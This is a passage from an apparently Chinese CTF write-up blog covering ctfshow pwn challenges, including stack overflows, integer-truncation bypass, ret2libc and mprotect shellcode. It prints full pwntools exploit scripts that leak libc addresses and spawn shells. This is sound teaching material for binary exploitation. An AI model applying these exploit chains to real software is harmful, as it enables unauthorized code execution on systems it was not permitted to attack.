class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x0000000000400803</span>  </span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400801</span>  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x08</span>) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret ) + p64(puts_got) * <span class="number">2</span> + p64(write_plt) + p64(ctfshow)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d7b1d118-7b0a-432f-bceb-ceeb4234f12e.png" alt="alt text"></p><p>然后，利用泄露出的<code>puts@got</code>地址确定libc版本：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/f415a5be-c78b-44b8-9a86-a0bb2cb337a1.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/48a894ea-b10a-47ac-b062-78479cad2962.png" alt="alt text"><br>使用<code>glibc-all-in-one</code>将libc安装下来。(怎么感觉这玩意有点不太准呢，我操作的问题？)</p><h2 id="pwn-05-练习">pwn_05(练习)</h2><p>朋友给了一个题，差点儿给自己pwn掉了。在这里记录一下。</p><p>checksec查保护，64位程序，仅开启NX保护，这个时候一想，签到题，应该很简单。<br>使用ida反编译打开。copy函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1b878f0a-9532-4354-a90b-f578b5937594.png" alt="alt text"><br>看不懂，丢给chat跑了一下。大概流程是，接收一个数字，低8位字节不超过<code>32</code>，<code>read</code>读入到<code>src</code>段中，然后将<code>src</code>段中的内容复制到<code>dest</code>数组中，限制大小为前面接受数字的低32位字节。<br>这里需要绕过，绕过了半天，问chat，给了我一个超大数字，结果没有卵用，最后还是群友的chat给出了思路。😢<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/af0192c7c15a8e501a9b13081e1950c0.jpg" alt="alt text"><br>使用gdb调试：<br>首先输入正常不超过32的数字<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ccab948e-63ad-4ed4-bc57-e2aa78b8fc76.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/76064a45-f6e4-4f23-8f52-d8598e4df693.png" alt="alt text"><br>可以看到，<code>read</code>与<code>memcpy</code>限制读入大小为<code>0x1f</code>。远远达不到我们想要溢出的长度<br>然后输入<code>256</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/31a44969-5e3f-45d0-bcb2-708dd12559f5.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/086c72ce-76de-44b8-849a-fe26619ca2a9.png" alt="alt text"><br>可以看到，此时限制读入的字节已经可以达到我们想要溢出的大小。<br>为什么会这样呢，因为：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/28d89ebe-d1b8-447c-b78f-8de4ad7f315f.png" alt="alt text"><br>所以在这里，256及256的倍数均可。<br>然后下一个难题就是，该程序没有使用rbp寄存器，偏移计算的问题。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/413d7d83-1087-474f-a564-290b04045293.png" alt="alt text"><br>不会，真不会，就这逼玩意我研究了一晚上。😭<br>可以看一下，这里寄存器<code>rbp</code>被设定为1<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d7ad479d-5dc6-42e1-8bc2-faab7fd54847.png" alt="alt text"><br>也就是说，程序没有使用<code>rbp</code>做栈基地址，而是直接通过<code>rsp</code>管理栈空间。也就是说，当程序创建<code>dest</code>时候，<code>rsp</code>指针会向下创建<code>0x38</code>大小的内存空间，当该内存空间被写满之后，便能直接覆盖到返回地址。也就是<br>偏移返回地址用户输入地址偏移=返回地址−用户输入地址<br>所以这里的偏移为<code>0x38</code>，并且我们不用再加<code>0x08</code>字节就可以覆盖到返回地址。<s>奶奶的，加了一晚上的<code>0x08</code></s><br>可以使用gdb调试验证<br>输入<code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaacccccccc</code><br>可以看到，栈中返回地址已经被覆盖<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/cf12a190-8e9f-4765-8149-6fcdafb3b8b6.png" alt="alt text"><br>编写exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.17.so&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">copy_addr = elf.sym[<span class="string">&#x27;copy&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">pop_rdi_ret = <span class="number">0x04007f3</span>  </span><br><span class="line">ret_addr = <span class="number">0x04005F9</span>  </span><br><span class="line">  </span><br><span class="line">offset = <span class="number">0x28</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(copy_addr)  </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * 0x28 + b&#x27;b&#x27; * 0x08 + b&#x27;cccc&#x27;  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))  </span><br><span class="line"><span class="comment"># gdb.attach(sh)  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;请输入字符串:&#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line"><span class="comment"># sh.recvall()  </span></span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr&quot;</span>, <span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, <span class="string">b&#x27;1024&#x27;</span>)  </span><br><span class="line">p2 = <span class="string">b&#x27;b&#x27;</span> * (offset)  </span><br><span class="line">p2 += p64(pop_rdi_ret)  </span><br><span class="line">p2 += p64(bin_sh)  </span><br><span class="line">p2 += p64(ret_addr)  </span><br><span class="line">p2 +=  p64(system_addr)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;请输入字符串:&#x27;</span>)  </span><br><span class="line"><span class="comment">#gdb.attach(sh)  </span></span><br><span class="line">sh.sendline(p2)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里选择libc版本为amd64的2.17的即可<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/efc70b1d-3636-475b-84df-70d1b0f9449d.png" alt="alt text"></p><h2 id="pwn-047">pwn_047</h2><p>ez ret2libc</p><p>32位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/15543056-ed6b-42de-8caf-8f2877c3e7c5.png" alt="alt text"><br>ida反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/14887ba6-a96d-4bdf-b653-826c1f08dc9a.png" alt="alt text"><br><code>gets</code>函数栈溢出，并且<code>main</code>函数中：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3d6768d6-ac26-4d60-9f9f-e21f7828e987.png" alt="alt text"><br><strong><code>%p</code>可以泄露函数<code>puts</code>的真实地址，就是libc函数地址</strong><br>也就是说，我们不用去构造<code>ROP</code>链泄露函数地址，直接可以计算基址，进而构造<code>system('/bin/sh')</code><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;puts: &#x27;</span>)  </span><br><span class="line">puts_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop= <span class="literal">True</span>).decode(), <span class="number">16</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;fflush &#x27;</span>)  </span><br><span class="line">fflush_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop= <span class="literal">True</span>).decode(), <span class="number">16</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;read: &#x27;</span>)  </span><br><span class="line">read_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop= <span class="literal">True</span>).decode(), <span class="number">16</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;write: &#x27;</span>)  </span><br><span class="line">write_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop= <span class="literal">True</span>).decode(), <span class="number">16</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)  </span><br><span class="line">gift_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop= <span class="literal">True</span>).decode(), <span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">offset = <span class="number">0x9c</span> + <span class="number">0x04</span>  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>本地打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/258e2282-a7fc-47af-bd1d-0fb49d9dc416.png" alt="alt text"></p><h2 id="pwn-048">pwn_048</h2><p>没有write了，试试用puts吧，更简单了呢</p><p>checksec查保护，32位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e0ef3cae-862e-45c7-b3b0-b397cfe9a77a.png" alt="alt text"><br>使用ida反编译：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c2b0b051-73a3-4749-af1c-3d0517657e3b.png" alt="alt text"><br><code>read</code>栈溢出，使用<code>puts</code>泄露<code>puts@got</code>地址，以此计算libc基地址。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">offset = <span class="number">0x6b</span> + <span class="number">0x04</span>  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(puts_plt) + p32(ctfshow) + p32(puts_got)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x04</span> + p32(bin_sh)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn-049">pwn_049</h2><p>静态编译？或许你可以找找mprotect函数</p><p>checksec查保护，32位程序，开启了NX保护与canary保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/0470e242-6658-43ef-bbc1-49e1d8eca622.png" alt="alt text"><br>拖入ida中反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/116726b2-e0eb-4ba6-96e4-7fcfecac762b.png" alt="alt text"><br><code>read</code>函数栈溢出，且是静态编译的程序，我们想到，使用<code>mprotect</code>函数选择一段内存空间修改为可读可写可执行，再将shellcode读入这段内存空间中，最后控制程序到这段空间中，便可以执行<code>shellcode</code><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">mprotect_plt = <span class="number">0x0806CDD0</span>  </span><br><span class="line">read_plt = <span class="number">0x0806BEE0</span>  </span><br><span class="line">pop_eax_edx_ebx_ret = <span class="number">0x08056194</span>  </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]  </span><br><span class="line">bss = <span class="number">0x080DB000</span>  </span><br><span class="line">bss_size = <span class="number">0x1000</span>  </span><br><span class="line">offset = <span class="number">0x12</span> + <span class="number">0x04</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(mprotect_plt) + p32(pop_eax_edx_ebx_ret) + p32(bss) + p32(bss_size) + p32(<span class="number">0x07</span>)  </span><br><span class="line">payload += p32(read_plt) + p32(pop_eax_edx_ebx_ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x1000</span>) + p32(bss)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line">sh.sendline(shellcode)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>本地打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e2884a41-34cb-492b-9f62-08b30007bc04.png" alt="alt text"></p><h2 id="pwn-050">pwn_050</h2><p>好像哪里不一样了<br>远程libc环境 Ubuntu 18</p><p>checksec查保护，64位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3bb74655-bf85-428f-8f63-d878d47aa9ef.png" alt="alt text"><br>使用ida反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ec737488-8645-4a3a-af2b-fbf89f5add79.png" alt="alt text"><br><code>gets</code>栈溢出，不存在<code>system('/bin/sh')</code>。<br>使用<code>ret2libc</code>即可<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x04007e3</span>  </span><br><span class="line">ret = <span class="number">0x04004fe</span>  </span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">0x08</span>  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x70 + 0x08) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15_ret ) + p64(puts_got) * 2 + p64(write_plt) + p64(ctfshow)  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6b1429b5-879b-4d4d-a2ac-f4f277be7c41.png" alt="alt text"></p><h2 id="pwn-051">pwn_051</h2><p>I‘m IronMan</p><p>checksec查保护，32位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5afe1939-c0f2-44b6-80a9-162528ede35b.png" alt="alt text"><br>使用ida反编译</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_8049059</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-Ch] [ebp-84h]  </span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-80h]  </span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">12</span>]; <span class="comment">// [esp+0h] [ebp-78h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">24</span>]; <span class="comment">// [esp+2Ch] 